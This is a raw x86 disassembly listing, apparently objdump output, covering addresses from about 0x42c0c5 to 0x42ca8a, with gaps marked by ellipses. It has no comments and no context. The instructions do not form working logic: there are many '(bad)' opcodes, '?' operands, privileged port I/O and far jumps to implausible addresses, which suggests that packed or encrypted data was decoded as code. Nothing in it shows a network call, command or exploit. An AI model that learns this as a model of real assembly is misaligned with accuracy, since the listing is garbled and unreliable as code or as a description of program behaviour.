  42c0c5:	add    BYTE PTR [edx+0x6b1adc2f],bl
  42c0cb:	xor    dl,al
  42c0cd:	mov    ebx,0x548bcb5f
  42c0d2:	xlat   BYTE PTR ds:[ebx]
  42c0d3:	xchg   ebp,eax
  42c0d4:	and    esp,0xb878b5c5
  42c0da:	mov    ds:0xba046aed,al
  42c0df:	mov    ebp,0x11bdf991
  42c0e4:	rcl    BYTE PTR [edx+0x69851a3f],0x5f
  42c0eb:	das    
  42c0ec:	clc    
  42c0ed:	xchg   ebp,eax
  42c0ee:	dec    edi
  42c0ef:	jmp    FWORD PTR [edi+0x14a69b61]
  42c0f5:	nop
  42c0f6:	int    0x20
  42c0f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c0f9:	adc    al,0x1c
  42c0fb:	mov    edi,0x8046c288
  42c100:	pop    edx
  42c101:	add    DWORD PTR [edi-0x34],edx
  42c104:	mov    ds:0x9dca47b5,al
  42c109:	mov    WORD PTR [edx+0x237c339],?
  42c10f:	stc    
  42c110:	push   ebp
  42c111:	sbb    al,0xad
  42c113:	dec    eax
  42c114:	sub    BYTE PTR [ebx-0x4fc2456f],bl
  42c11a:	add    esi,DWORD PTR [ecx+0x2e]
  42c11d:	lods   al,BYTE PTR gs:[esi]
  42c11f:	push   ecx
  42c120:	pop    ecx
  42c121:	push   ds
  42c122:	and    edi,DWORD PTR [ecx]
  42c124:	push   ebx
  42c125:	mov    esp,0x1353e48f
  42c12a:	add    al,0x20
  42c12c:	and    eax,0x6fefa64f
  42c131:	repz xchg ebp,eax
  42c133:	in     al,0x1e
  42c135:	mov    ax,0x5240
  42c139:	dec    eax
  42c13a:	add    al,0x8b
  42c13c:	in     al,dx
  42c13d:	fwait
  42c13e:	xchg   edi,eax
  42c13f:	pop    ecx
  42c140:	ret    0x9b59
  42c143:	adc    DWORD PTR [ecx+0x54c72a48],0x36f7f167
  42c14d:	test   DWORD PTR [ebx+0x18addd63],ebx
  42c153:	fistp  WORD PTR ss:[edi]
  42c156:	cmp    ebx,DWORD PTR [esi]
  42c158:	dec    ebp
  42c159:	out    0x6a,al
  42c15b:	sbb    eax,0x71ca55d0
  42c160:	test   al,0x3a
  42c162:	sub    al,0xf8
  42c164:	test   eax,0xe2c5a861
  42c169:	sub    ebp,eax
  42c16b:	bound  ebx,QWORD PTR [edi+esi*4-0x10]
  42c16f:	push   0xe64b5191
  42c174:	xor    cl,BYTE PTR [ecx-0x23595abc]
  42c17a:	inc    eax
  42c17b:	mov    dh,0x75
  42c17d:	and    esp,DWORD PTR [ebx]
  42c17f:	ror    BYTE PTR [edx],1
  42c181:	push   ds
  42c182:	fnstenv [ebx-0x4d2e2f7f]
  42c188:	fisttp WORD PTR [edx]
  42c18a:	inc    ebx
  42c18b:	test   DWORD PTR [edi+0xf3c72d],eax
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	add    dh,ch
  42c202:	xchg   DWORD PTR [esp+eiz*8+0x40001d7],esi
  42c209:	add    DWORD PTR [eax],eax
  42c20b:	add    BYTE PTR [edi+esi*2-0x4c41c5a0],al
  42c212:	test   al,0x1f
  42c214:	outs   dx,BYTE PTR ds:[esi]
  42c215:	(bad)  
  42c216:	fld    st(4)
  42c218:	out    0xa7,al
  42c21a:	imul   BYTE PTR [ebp+edx*4-0x35afeac]
  42c221:	(bad)  
  42c222:	outs   dx,BYTE PTR ds:[esi]
  42c223:	mov    esi,0x7b0bc258
  42c228:	or     eax,0x1c6386be
  42c22d:	mov    edx,0x88a339bf
  42c232:	sbb    DWORD PTR [ebx],esi
  42c234:	lods   al,BYTE PTR ds:[esi]
  42c235:	xor    DWORD PTR [bx+si+0x3cf],0xffffffe0
  42c23b:	jbe    0x42c1d1
  42c23d:	dec    esi
  42c23e:	lock mov ecx,DWORD PTR [eax+0x51b2e2af]
  42c245:	ror    BYTE PTR [ecx+0x5c],1
  42c248:	(bad)  
  42c249:	(bad)  
  42c24a:	fadd   st(3),st
  42c24c:	ins    DWORD PTR es:[edi],dx
  42c24d:	cdq    
  42c24e:	push   ecx
  42c24f:	inc    esi
  42c250:	int3   
  42c251:	jns    0x42c28b
  42c253:	int3   
  42c254:	iret   
  42c255:	mov    al,ds:0x1a8d3fe5
  42c25a:	mov    BYTE PTR [edx+0x884cdf0],ah
  42c260:	int    0xb5
  42c262:	popa   
  42c263:	pop    ecx
  42c264:	add    DWORD PTR [eax+0x77],0xffffffa7
  42c268:	xchg   ecx,eax
  42c269:	(bad)  
  42c26a:	out    0xe0,eax
  42c26c:	add    bl,BYTE PTR [bp+si]
  42c26f:	(bad)  
  42c270:	std    
  42c271:	test   al,0xaf
  42c273:	mov    bh,0xfc
  42c275:	or     al,0x1b
  42c277:	pop    ecx
  42c278:	sub    eax,0x6575e79c
  42c27d:	pop    edx
  42c27e:	push   esi
  42c27f:	jne    0x42c220
  42c281:	(bad)  
  42c282:	in     eax,dx
  42c283:	lods   eax,DWORD PTR ds:[esi]
  42c285:	call   0xfac98621
  42c28a:	lock jp 0x42c2f9
  42c28d:	outs   dx,BYTE PTR ds:[esi]
  42c28e:	dec    edx
  42c28f:	and    eax,0x17651382
  42c294:	jp     0x42c305
  42c296:	into   
  42c297:	pop    ebx
  42c298:	cmp    DWORD PTR [ebp-0x7d8a14be],eax
  42c29e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c29f:	push   0xafabf154
  42c2a4:	cmp    eax,0x13c8f3a1
  42c2a9:	push   ecx
  42c2aa:	aas    
  42c2ab:	sub    bh,ah
  42c2ad:	shr    ebp,0xad
  42c2b0:	les    esp,FWORD PTR [eax-0x7e]
  42c2b3:	std    
  42c2b4:	lods   eax,DWORD PTR ds:[esi]
  42c2b5:	mov    ebp,0xa04ff30d
  42c2ba:	shl    edi,cl
  42c2bc:	leave  
  42c2bd:	sub    eax,0xbe0b28ea
  42c2c2:	mov    esp,0x6223e3a3
  42c2c7:	adc    eax,0x379c70e1
  42c2cc:	pop    es
  42c2cd:	cmp    edi,DWORD PTR [ecx+0x7d]
  42c2d0:	mov    edi,0x5a6d476
  42c2d5:	sub    ebx,esi
  42c2d7:	or     BYTE PTR [edx],bl
  42c2d9:	scas   eax,DWORD PTR es:[edi]
  42c2da:	arpl   WORD PTR [edi-0x1b],dx
  42c2dd:	pop    ebx
  42c2de:	mov    cl,0xc0
  42c2e0:	out    dx,al
  42c2e1:	xor    dh,BYTE PTR [esi-0x3f]
  42c2e4:	xor    DWORD PTR ds:0xccb0ffdb,esi
  42c2ea:	add    BYTE PTR [ebp+0x71],bh
  42c2ed:	shl    edi,cl
  42c2ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2f0:	or     al,0xae
  42c2f2:	rcl    DWORD PTR [edx],cl
  42c2f4:	dec    ebp
  42c2f6:	lea    ecx,[edi+0x5f167be]
  42c2fc:	add    bl,BYTE PTR [ebx-0x4f]
  42c2ff:	mov    edx,0x48415639
  42c304:	jle    0x42c2cc
  42c306:	in     al,dx
  42c307:	jg     0x42c34d
  42c309:	fdivp  st(5),st
  42c30b:	add    dh,BYTE PTR [ecx-0x5c]
  42c30e:	mov    edx,0x82
	...
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xdb7666f6
  42c383:	sub    ebp,eax
  42c385:	fadd   DWORD PTR [ecx]
  42c387:	add    BYTE PTR [ecx+eax*1],al
  42c38a:	add    BYTE PTR [eax],al
  42c38c:	dec    esi
  42c38d:	jne    0x42c341
  42c38f:	push   esi
  42c390:	dec    eax
  42c391:	pusha  
  42c392:	je     0x42c351
  42c394:	ins    BYTE PTR es:[edi],dx
  42c395:	test   DWORD PTR [esi-0x13],ecx
  42c398:	lds    ebp,FWORD PTR [ebx+ebx*8+0x53]
  42c39c:	sub    al,0x6
  42c39e:	les    eax,FWORD PTR [eiz*4+0x56e9329]
  42c3a5:	dec    ebx
  42c3a6:	xor    eax,0x7a3ce6bf
  42c3ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c3ac:	dec    ebp
  42c3ad:	xor    eax,DWORD PTR [esi+edx*1+0x4d1857bb]
  42c3b4:	push   0xa4433f1d
  42c3b9:	clc    
  42c3ba:	ss sahf 
  42c3bc:	fiadd  WORD PTR [ebx+eiz*8-0x27]
  42c3c0:	mov    ebp,0xde57a7f1
  42c3c5:	sti    
  42c3c6:	pop    edx
  42c3c7:	mov    dl,0x76
  42c3c9:	mov    eax,0x5b412bb9
  42c3ce:	in     al,dx
  42c3cf:	xor    ebp,ebp
  42c3d1:	test   DWORD PTR [ebx-0x4f0dce3],esi
  42c3d7:	or     al,0xcb
  42c3d9:	sub    eax,0x47436968
  42c3de:	call   0xebf3:0xf9d324
  42c3e5:	test   eax,ecx
  42c3e7:	inc    esi
  42c3e8:	xchg   ebp,eax
  42c3e9:	stos   BYTE PTR es:[edi],al
  42c3ea:	pop    ebp
  42c3eb:	mov    ah,0x5a
  42c3ed:	mov    ebx,0x596cb29a
  42c3f2:	das    
  42c3f3:	push   ds
  42c3f4:	test   BYTE PTR [esi-0x58],cl
  42c3f7:	jmp    0x40f254c9
  42c3fc:	and    esp,DWORD PTR [ecx-0x2ced66be]
  42c402:	xchg   esi,eax
  42c403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c404:	js     0x42c45b
  42c406:	pushf  
  42c407:	icebp  
  42c408:	fld    DWORD PTR [ecx]
  42c40a:	push   es
  42c40b:	cdq    
  42c40c:	sar    edi,1
  42c40e:	push   es
  42c40f:	jecxz  0x42c40d
  42c411:	inc    edi
  42c412:	dec    edx
  42c413:	push   ebx
  42c414:	out    dx,eax
  42c415:	lea    ebp,ds:0xc68abf4d
  42c41b:	jno    0x42c498
  42c41d:	fs icebp 
  42c41f:	pop    edx
  42c420:	std    
  42c421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c422:	mov    edx,DWORD PTR [ebx]
  42c424:	sbb    edx,DWORD PTR [ebp-0x533a7b56]
  42c42a:	sub    eax,0x18dd7420
  42c42f:	pop    esi
  42c430:	and    DWORD PTR [eax+ecx*4-0x7dfed084],0xcbd4b627
  42c43b:	mov    edx,0x79405ede
  42c440:	add    DWORD PTR [ebp-0x5b40b685],esp
  42c446:	ins    BYTE PTR es:[edi],dx
  42c447:	sub    ah,BYTE PTR [eax]
  42c449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c44a:	push   cs
  42c44b:	div    BYTE PTR [edi+0x18]
  42c44e:	inc    edi
  42c44f:	data16 hlt 
  42c451:	mov    ecx,0x9de2a549
  42c456:	enter  0xa13f,0x82
  42c45a:	stos   BYTE PTR es:[edi],al
  42c45b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c45c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c45d:	rcr    BYTE PTR [ebp-0x25b356d9],cl
  42c463:	mov    ebp,0xc1022c1e
  42c468:	jo     0x42c4b7
  42c46a:	frstor ds:0x8e60acab
  42c470:	and    eax,0x7f7bc348
  42c475:	and    eax,0x3bb67d10
  42c47a:	jbe    0x42c48a
  42c47c:	push   ebp
  42c47d:	sbb    cl,BYTE PTR gs:0x173d5a01
  42c484:	jg     0x42c476
  42c486:	fwait
  42c487:	ror    BYTE PTR [ecx-0x4d],0xc1
  42c48b:	call   0xe91970dc
	...
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x1234,0x25
  42c502:	ins    DWORD PTR es:[edi],dx
  42c503:	sub    esp,0xffffffd9
  42c506:	add    DWORD PTR [eax],eax
  42c508:	add    al,0x1
  42c50a:	add    BYTE PTR [eax],al
  42c50c:	sub    BYTE PTR [edi-0x72],0x12
  42c510:	mov    bh,0x33
  42c512:	call   FWORD PTR [ecx-0x234021d0]
  42c518:	push   esi
  42c519:	data16 sub al,0x12
  42c51c:	push   ebp
  42c51d:	push   es
  42c51e:	stos   BYTE PTR es:[edi],al
  42c51f:	dec    esi
  42c520:	cmc    
  42c521:	and    BYTE PTR [ecx],0x45
  42c524:	lds    edi,FWORD PTR [esi+eiz*8-0x4febb786]
  42c52b:	mov    WORD PTR [esi-0x5cdc5ee4],gs
  42c531:	push   0x853cf55c
  42c536:	adc    BYTE PTR [edx-0x7a],dl
  42c539:	loop   0x42c520
  42c53b:	pop    eax
  42c53c:	push   ebx
  42c53d:	xor    eax,0x9c000236
  42c542:	or     eax,0x69d2d2be
  42c547:	jmp    0x42c510
  42c549:	jb     0x42c52e
  42c54b:	lss    esi,FWORD PTR [ebx]
  42c54e:	xor    eax,0x6aad20dc
  42c553:	aam    0xc3
  42c555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c556:	lock inc esi
  42c558:	adc    DWORD PTR [edx-0x71],ebp
  42c55b:	rol    bh,cl
  42c55d:	push   ecx
  42c55e:	and    eax,DWORD PTR [edx]
  42c560:	inc    esi
  42c561:	dec    edi
  42c562:	pushf  
  42c563:	or     DWORD PTR [ebx+0x71bc34a],edx
  42c569:	xor    eax,0x56016ebf
  42c56e:	je     0x42c555
  42c570:	adc    DWORD PTR [esi],0x3c6bfa8
  42c576:	sub    al,bh
  42c578:	xchg   esp,eax
  42c579:	mov    ebp,0x40a586cd
  42c57e:	jne    0x42c55b
  42c580:	jne    0x42c58c
  42c582:	mov    WORD PTR [edi+edx*1+0x7],ds
  42c586:	mul    DWORD PTR [ecx+0x8]
  42c589:	test   eax,0x4cff906a
  42c58e:	jne    0x42c511
  42c590:	je     0x42c5b0
  42c592:	aad    0x41
  42c594:	cli    
  42c595:	mov    cl,0x56
  42c597:	test   bl,ch
  42c599:	icebp  
  42c59a:	xchg   ebp,eax
  42c59b:	sbb    eax,0x4ef0bc3e
  42c5a0:	out    0x79,eax
  42c5a2:	adc    ch,ch
  42c5a4:	shr    ebp,1
  42c5a6:	call   0x5155:0xdd857860
  42c5ad:	(bad)  
  42c5ae:	and    edi,DWORD PTR [esp+edx*4]
  42c5b1:	ins    BYTE PTR es:[edi],dx
  42c5b2:	in     eax,dx
  42c5b3:	or     BYTE PTR [edi-0x46],cl
  42c5b6:	inc    edi
  42c5b7:	pop    esi
  42c5b8:	jbe    0x42c568
  42c5ba:	push   ecx
  42c5bb:	jns    0x42c602
  42c5bd:	push   ebx
  42c5be:	into   
  42c5bf:	rol    BYTE PTR ds:0xa621b63b,cl
  42c5c5:	jecxz  0x42c582
  42c5c7:	loop   0x42c5a1
  42c5c9:	je     0x42c5e8
  42c5cb:	push   eax
  42c5cc:	jb     0x42c633
  42c5ce:	and    BYTE PTR [eax-0x6b],ch
  42c5d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c5d2:	dec    edi
  42c5d3:	(bad)  
  42c5d5:	das    
  42c5d6:	jg     0x42c5e3
  42c5d8:	and    eax,0xfd5d3482
  42c5dd:	fsubr  QWORD PTR ds:0xfd96c209
  42c5e3:	or     al,0xa7
  42c5e5:	adc    DWORD PTR [ebx+0xa],ecx
  42c5e8:	adc    DWORD PTR [edi+0x4],ebx
  42c5eb:	pmaddwd mm2,QWORD PTR [eax+0x78fbc380]
  42c5f2:	retf   
  42c5f3:	jmp    0x4e2953a
  42c5f8:	push   edx
  42c5f9:	mov    eax,ds:0x5cb930a3
  42c5fe:	pop    ecx
  42c5ff:	cmp    eax,0xb2ef0d32
  42c604:	pop    edx
  42c605:	and    ebp,edi
  42c607:	and    DWORD PTR [esi],esi
  42c609:	aam    0x88
  42c60b:	cmpxchg8b QWORD PTR [ecx]
  42c60e:	sub    cl,0x0
	...
  42c671:	add    BYTE PTR [eax],al
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0x52920395]
  42c681:	into   
  42c682:	jmp    0x400:0x1daf0dd
  42c689:	add    DWORD PTR [eax],eax
  42c68b:	add    BYTE PTR [ebx+0x5d],bl
  42c68e:	jmp    0xfb16:0x917e2769
  42c695:	loopne 0x42c6ca
  42c697:	popa   
  42c698:	push   ebp
  42c699:	dec    edx
  42c69a:	fwait
  42c69b:	add    al,0x32
  42c69d:	add    esi,DWORD PTR [esi]
  42c69f:	push   ebx
  42c6a0:	fwait
  42c6a1:	pop    edx
  42c6a2:	add    ch,BYTE PTR cs:[ebx+0x2118b456]
  42c6a9:	(bad)  [ecx+0x1a]
  42c6ac:	push   DWORD PTR [esi+eax*8-0x3d]
  42c6b0:	dec    ebp
  42c6b1:	inc    edx
  42c6b2:	pop    ebx
  42c6b3:	mov    dl,0xfe
  42c6b5:	sar    DWORD PTR [edx],0x0
  42c6b8:	add    al,BYTE PTR [ecx-0x3a]
  42c6bb:	pop    edx
  42c6bc:	jne    0x42c64d
  42c6be:	pop    ds
  42c6bf:	push   0x788695df
  42c6c4:	cmp    eax,0x86f774d5
  42c6c9:	inc    edx
  42c6ca:	xchg   esp,eax
  42c6cb:	jne    0x42c6eb
  42c6cd:	adc    esp,DWORD PTR [edi-0x1f8854bf]
  42c6d3:	cmp    esi,esi
  42c6d5:	xor    BYTE PTR [edi],ah
  42c6d7:	or     eax,0x911f76b2
  42c6dc:	test   DWORD PTR [esi+ebp*8],ebp
  42c6df:	icebp  
  42c6e0:	sbb    esp,DWORD PTR [eax+0xf240907]
  42c6e6:	jno    0x42c688
  42c6e8:	ja     0x42c723
  42c6ea:	mov    dh,0x53
  42c6ec:	icebp  
  42c6ed:	add    BYTE PTR [ebx],bh
  42c6ef:	repz jo 0x42c731
  42c6f2:	xor    DWORD PTR [edx-0x221b3a6],ebp
  42c6f8:	loopne 0x42c68e
  42c6fa:	jmp    0x42c73d
  42c6fc:	adc    cl,BYTE PTR [eax-0x637c639d]
  42c702:	sbb    DWORD PTR [ebx-0x130ef4bf],ebp
  42c708:	jg     0x42c720
  42c70a:	pop    esp
  42c70b:	push   0xea96b5eb
  42c710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c711:	inc    esi
  42c712:	popf   
  42c713:	inc    eax
  42c714:	fstp   DWORD PTR [esi]
  42c716:	jae    0x42c721
  42c718:	pop    edx
  42c719:	adc    BYTE PTR [edx-0x5ab08d12],ah
  42c71f:	mov    ds:0x91425210,eax
  42c724:	mov    esi,0xe80abccf
  42c729:	sbb    eax,0x2d27ec40
  42c72e:	repz imul eax,DWORD PTR [ecx+0x3157b0b2],0x45a64214
  42c739:	pop    edi
  42c73a:	aas    
  42c73b:	stos   DWORD PTR es:[edi],eax
  42c73c:	scas   al,BYTE PTR es:[edi]
  42c73d:	rcr    BYTE PTR [ecx+0x426b8418],cl
  42c743:	das    
  42c744:	add    DWORD PTR [edi],edx
  42c746:	stos   BYTE PTR es:[edi],al
  42c747:	lahf   
  42c748:	inc    ebx
  42c749:	xchg   ebx,eax
  42c74a:	or     ebp,ebp
  42c74c:	push   edi
  42c74d:	mov    ds:0x30034df1,al
  42c752:	scas   al,BYTE PTR es:[edi]
  42c753:	imul   esi,DWORD PTR [edx-0x3fcc6265],0x29
  42c75a:	cmp    esi,ecx
  42c75c:	neg    BYTE PTR [ecx-0x6b]
  42c75f:	mov    eax,ds:0x6502496c
  42c764:	je     0x42c78d
  42c766:	sbb    edx,esp
  42c768:	mov    dl,0xcc
  42c76a:	xor    al,0x65
  42c76c:	xchg   esi,eax
  42c76d:	adc    DWORD PTR [ebx+0x29],edx
  42c770:	out    0xad,al
  42c772:	(bad)  
  42c773:	dec    edx
  42c774:	jbe    0x42c701
  42c776:	stos   DWORD PTR es:[edi],eax
  42c777:	daa    
  42c778:	test   eax,0xbd7cd6cf
  42c77d:	sahf   
  42c77e:	jnp    0x42c7fc
  42c780:	stos   BYTE PTR es:[edi],al
  42c781:	js     0x42c76a
  42c783:	push   esi
  42c784:	pop    ecx
  42c785:	jne    0x42c71f
  42c787:	lds    esp,FWORD PTR [edx+esi*4+0x6a]
  42c78b:	xor    al,0x68
  42c78d:	test   BYTE PTR [ecx+0x70],ah
	...
  42c7f4:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c7fa:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c800:	cmp    edi,DWORD PTR [ecx]
  42c802:	ins    DWORD PTR es:[edi],dx
  42c803:	xchg   ebp,eax
  42c804:	hlt    
  42c805:	fild   DWORD PTR [ecx]
  42c807:	add    BYTE PTR [ecx+eax*1],al
  42c80a:	add    BYTE PTR [eax],al
  42c80c:	test   DWORD PTR [ecx+ebp*8+0x2fe2db80],edi
  42c813:	xchg   edi,eax
  42c814:	sub    BYTE PTR [ebx],bl
  42c816:	pushf  
  42c817:	mov    ?,WORD PTR [ebp+0x52765eb4]
  42c81d:	mov    dl,0x51
  42c81f:	pop    ebx
  42c820:	dec    ecx
  42c821:	in     eax,dx
  42c822:	cli    
  42c823:	dec    edx
  42c824:	adc    al,0xda
  42c826:	sbb    BYTE PTR [edx-0x2d],0x88
  42c82a:	hlt    
  42c82b:	fs cmc 
  42c82d:	outs   dx,DWORD PTR ds:[esi]
  42c82e:	push   esp
  42c82f:	pusha  
  42c830:	add    eax,ebp
  42c832:	push   eax
  42c833:	push   esi
  42c834:	adc    dh,BYTE PTR [ebp-0x10]
  42c837:	pop    ebp
  42c838:	sbb    eax,0xc88b74d4
  42c83d:	xor    al,0x9f
  42c83f:	and    al,0x2
  42c841:	les    esi,FWORD PTR [ebx]
  42c843:	mov    cl,0xd6
  42c845:	retf   0x189a
  42c848:	dec    eax
  42c849:	dec    esi
  42c84a:	sahf   
  42c84b:	sub    eax,0x65e5f84e
  42c850:	cld    
  42c851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c852:	sbb    DWORD PTR [eax+0xd],0x2d8eb9d3
  42c859:	push   ecx
  42c85a:	out    0x2e,eax
  42c85c:	gs pop esi
  42c85e:	push   esp
  42c85f:	scas   eax,DWORD PTR es:[edi]
  42c860:	mov    ecx,0x710cdd6b
  42c865:	gs jge 0x42c8a8
  42c868:	push   0x52
  42c86a:	fiadd  DWORD PTR [edi-0x65c61e18]
  42c870:	cmc    
  42c871:	add    ecx,esi
  42c873:	mov    ds:0x901a086,al
  42c878:	jecxz  0x42c82b
  42c87a:	(bad)  
  42c87b:	sbb    eax,0x959aaa5f
  42c880:	setge  BYTE PTR [ebx+0x6d]
  42c884:	into   
  42c885:	mov    al,ds:0x5738905a
  42c88a:	or     al,0xdf
  42c88c:	and    DWORD PTR ds:[edx+0x4],edi
  42c890:	out    dx,al
  42c891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c892:	push   esp
  42c893:	adc    ebp,DWORD PTR [ebx]
  42c895:	and    eax,0x161e4927
  42c89a:	push   edx
  42c89b:	adc    al,0x1d
  42c89d:	or     eax,DWORD PTR [ebp+0x5e]
  42c8a0:	sbb    DWORD PTR [ecx],esp
  42c8a2:	fisubr DWORD PTR [edx+ecx*1-0x64]
  42c8a6:	jmp    0xc1064fc3
  42c8ab:	jmp    0xaf0b2ae4
  42c8b0:	(bad)  
  42c8b1:	ret    
  42c8b2:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42c8b4:	push   esp
  42c8b5:	push   edi
  42c8b6:	add    al,BYTE PTR [ebx]
  42c8b8:	cmp    bl,BYTE PTR [ebx-0x5a]
  42c8bb:	clc    
  42c8bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c8bd:	push   ebp
  42c8be:	jmp    0x42c874
  42c8c0:	mov    eax,ds:0xe98b8810
  42c8c5:	sbb    ebx,DWORD PTR [ecx+eax*4+0x4]
  42c8c9:	sub    esi,DWORD PTR [edi]
  42c8cb:	sbb    bl,BYTE PTR [eax+0x24]
  42c8ce:	mov    edx,edi
  42c8d0:	mov    DWORD PTR [esi],ebp
  42c8d2:	add    al,0xca
  42c8d4:	jne    0x42c8ae
  42c8d6:	test   ebx,edx
  42c8d8:	sub    eax,0xb0f311c9
  42c8dd:	int3   
  42c8de:	lods   eax,DWORD PTR ds:[esi]
  42c8df:	call   0xdc65e282
  42c8e4:	push   ecx
  42c8e5:	pop    edx
  42c8e6:	push   edx
  42c8e7:	adc    edx,eax
  42c8e9:	fistp  QWORD PTR [edx]
  42c8eb:	mov    bh,0xd4
  42c8ed:	mov    edi,0x7c4336d4
  42c8f2:	aad    0x70
  42c8f4:	ficom  WORD PTR [edx+0x47bda78c]
  42c8fa:	call   0x8911:0xb6353255
  42c901:	int3   
  42c902:	add    al,0x88
  42c904:	ins    DWORD PTR es:[edi],dx
  42c905:	jbe    0x42c90c
  42c907:	sub    ah,BYTE PTR [ebx]
  42c909:	pop    ebx
  42c90a:	mov    ah,0x40
  42c90c:	call   0x0:0x8503ff
	...
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x7b6ed254
  42c984:	clc    
  42c985:	fadd   QWORD PTR [ecx]
  42c987:	add    BYTE PTR [ecx+eax*1],al
  42c98a:	add    BYTE PTR [eax],al
  42c98c:	push   0x8ef52663
  42c991:	js     0x42c91f
  42c993:	(bad)  
  42c994:	xor    eax,DWORD PTR [edx+0x2cb01b8c]
  42c99a:	ret    
  42c99b:	std    
  42c99c:	jle    0x42c9bb
  42c99e:	(bad)  
  42c99f:	lea    esi,[edi+0x3e]
  42c9a2:	popf   
  42c9a3:	loope  0x42c92a
  42c9a5:	mov    DWORD PTR [ebp-0x54769967],esp
  42c9ab:	sbb    DWORD PTR [edx],0xd7108bda
  42c9b1:	(bad)  
  42c9b2:	mov    al,0xa4
  42c9b4:	aam    0x59
  42c9b6:	jbe    0x42c943
  42c9b8:	and    BYTE PTR [edi-0x59],ch
  42c9bb:	mov    al,ds:0x9e2f7654
  42c9c0:	cmp    BYTE PTR [edi-0x1b102672],al
  42c9c6:	loope  0x42c9f2
  42c9c8:	repz or al,0x34
  42c9cb:	cmp    DWORD PTR [ebp-0x20],eax
  42c9ce:	enter  0xea3e,0x2f
  42c9d2:	add    esp,esi
  42c9d4:	or     bl,BYTE PTR [edi]
  42c9d6:	ret    0x63fc
  42c9d9:	addr16 out dx,al
  42c9db:	inc    ecx
  42c9dc:	out    dx,eax
  42c9dd:	and    dl,BYTE PTR [ebp+0x5726d43d]
  42c9e3:	loope  0x42ca5f
  42c9e5:	add    ebp,DWORD PTR ds:0x1690c85f
  42c9eb:	xor    BYTE PTR [esi],dh
  42c9ed:	inc    esi
  42c9ee:	xor    eax,0x1b75c163
  42c9f3:	in     al,dx
  42c9f4:	loope  0x42c9ed
  42c9f6:	dec    eax
  42c9f7:	outs   dx,BYTE PTR ds:[esi]
  42c9f8:	fidivr DWORD PTR [edx-0x3c884213]
  42c9fe:	pop    ebp
  42c9ff:	sub    ebx,DWORD PTR [ebp-0x26658978]
  42ca05:	mov    edi,0xefc80321
  42ca0a:	cli    
  42ca0b:	jno    0x42ca25
  42ca0d:	enter  0xfd5f,0x78
  42ca11:	test   ebx,esp
  42ca13:	nop
  42ca14:	js     0x42ca93
  42ca16:	jae    0x42ca4b
  42ca18:	jbe    0x42ca79
  42ca1a:	sbb    BYTE PTR [ebx-0xa],bh
  42ca1d:	xchg   DWORD PTR ds:0xf0459910,ebx
  42ca23:	jns    0x42ca57
  42ca25:	cmc    
  42ca26:	dec    esi
  42ca27:	pop    edi
  42ca28:	dec    ecx
  42ca29:	nop
  42ca2a:	mov    al,0xe6
  42ca2c:	jnp    0x42ca44
  42ca2e:	adc    BYTE PTR [edi+0x4d8dab0],0x17
  42ca35:	pop    edx
  42ca36:	adc    edx,esp
  42ca38:	fstp   TBYTE PTR [edx+ebx*8-0x27]
  42ca3c:	mov    ch,0x90
  42ca3e:	add    BYTE PTR [esp+edx*2-0x22],bh
  42ca42:	jg     0x42c9fe
  42ca44:	ret    
  42ca45:	ds push edx
  42ca47:	fwait
  42ca48:	xchg   ecx,eax
  42ca49:	adc    al,0xf5
  42ca4b:	add    bh,al
  42ca4d:	(bad)  
  42ca4e:	cld    
  42ca4f:	repnz xchg esi,eax
  42ca51:	out    0x90,eax
  42ca53:	mov    al,ds:0xc81645df
  42ca58:	push   eax
  42ca59:	sbb    al,0x2c
  42ca5b:	icebp  
  42ca5c:	retf   0x7063
  42ca5f:	adc    al,0x58
  42ca61:	mov    ecx,0xfed6adac
  42ca66:	mov    esi,edi
  42ca68:	retf   
  42ca69:	retf   0x2ad7
  42ca6c:	dec    ebx
  42ca6d:	das    
  42ca6e:	xor    eax,0xd159723b
  42ca73:	push   ss
  42ca74:	mov    DWORD PTR [ebp-0xb],esp
  42ca77:	xchg   edi,eax
  42ca78:	xor    ecx,eax
  42ca7a:	cs sti 
  42ca7c:	leave  
  42ca7d:	ss ins BYTE PTR es:[edi],dx
  42ca7f:	jno    0x42ca7f
  42ca81:	mov    al,al
  42ca83:	mov    eax,0xfcb4f88c
  42ca88:	jbe    0x42ca26
  42ca8a:	xchg   BYTE PTR [ebx],bh
